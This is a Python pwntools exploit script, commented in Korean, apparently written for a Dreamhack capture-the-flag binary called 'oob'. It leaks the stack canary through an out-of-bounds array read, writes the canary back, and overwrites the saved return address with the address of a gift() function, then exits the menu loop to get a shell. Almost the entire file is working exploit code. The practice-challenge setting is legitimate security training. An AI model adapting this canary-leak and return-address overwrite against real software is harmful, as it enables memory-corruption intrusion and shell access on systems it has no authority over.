from pwn import *

# 실행 환경에 맞게 주석을 해제하거나 수정하세요.
# p = process("./oob")
p = process("/Users/limyoutaek/Downloads/for_usr/5.oob/oob")
# p = remote("host3.dreamhack.games", 12137)

context.arch = 'amd64'
# context.log_level = 'debug' # 상세한 입출력을 보려면 주석 해제

# objdump -d ./oob | grep gift
gift_addr = 0x4011b6

# 스택에서 array 변수 기준 상대적인 오프셋 (추정)
# 컴파일러나 환경에 따라 달라질 수 있음
CANARY_IDX = 32
RET_ADDR_IDX = 34

# --- 상호작용 함수 ---

def get_menu_prompt():
    return p.recvuntil(b"3. echo\n")

def choose_menu(choice):
    p.sendline(str(choice).encode())

def read_val(index):
    choose_menu(1)
    p.sendlineafter(b":", str(index).encode())
    output = p.recvline().strip()
    get_menu_prompt() # 메뉴 프롬프트까지 읽어서 버퍼를 정리
    if b":" in output:
        val_str = output.split(b":")[1].strip()
        return int(val_str)
    else:
        log.warning(f"Failed to read index {index}. Got: {output.decode()}")
        return None

def write_val(index, value):
    choose_menu(2)
    p.sendlineafter(b":", str(index).encode())
    p.sendlineafter(b":", str(value).encode())
    get_menu_prompt() # 메뉴 프롬프트까지 읽어서 버퍼를 정리

def exit_loop():
    choose_menu(0)

# --- 익스플로잇 ---

# 처음 메뉴를 기다림
get_menu_prompt()

# 1. 카나리 값 유출 시도
log.info("Attempting to leak canary...")
canary = read_val(CANARY_IDX)

if canary is None:
    log.error("Could not leak canary. The exploit cannot proceed.")
else:
    log.success(f"Canary leaked: {hex(canary)}")

    # 2. 반환 주소 덮어쓰기
    log.info("Writing back canary...")
    write_val(CANARY_IDX, canary)

    log.info("Overwriting return address with gift() address...")
    write_val(RET_ADDR_IDX, gift_addr)

    # 3. main 함수를 종료하여 셸 실행
    log.info("Exiting loop to pop shell...")
    exit_loop()

    p.interactive()